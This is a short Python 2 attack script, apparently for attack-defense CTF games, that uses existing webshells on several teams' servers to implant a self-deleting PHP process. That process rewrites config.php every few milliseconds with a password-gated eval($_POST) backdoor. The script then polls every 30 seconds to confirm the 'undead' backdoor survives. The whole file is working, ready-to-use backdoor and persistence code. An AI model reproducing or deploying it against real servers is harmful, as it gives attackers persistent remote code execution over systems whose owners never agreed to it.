#By ZacharyZcR
import requests
import time
#------------------------------------------------------------------------------------Edit-this-part----------
trojan_data = {'a':'''ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file='config.php';$code='<?php if(md5($_GET["pass"])=="7eace5a6944abdd9419f36694fdf54ca"){@eval($_POST[a]);}?>';while(1){file_put_contents($file,$code);usleep(5000);}?>'''
}
webshell_name = raw_input("Please input your webshell's name:")
trojan_name = raw_input("Please input your Undead Trojan Horse's name:")
	
team_number = input("Number of teams:")
base_url = []
for i in range(team_number):
	multi_url = raw_input("Input the webshell url(Except for the name of the webshell):")
	base_url.append(multi_url)
	r = requests.get(base_url[i]+webshell_name)
	if r.status_code == 200:
		print "Webshell",i+1,"works well."
	else:
		print "Webshell",i+1,"failed."
		

for i in range(team_number):
	try:
		r = requests.post(base_url[i]+webshell_name,data=trojan_data,timeout=1)
	except:
		r = requests.get(base_url[i]+trojan_name)
		if r.status_code == 200:
			print "Undead Trojan Horse",i+1,"Implanted Successfully."
	print "*******************************************************"
	
while (1):
	for i in range(team_number):
		r = requests.get(base_url[i]+trojan_name)
		if r.status_code == 200:
			print "The Undead Trojan",i+1,"still lives."
			print "*******************************************************"
	time.sleep(30)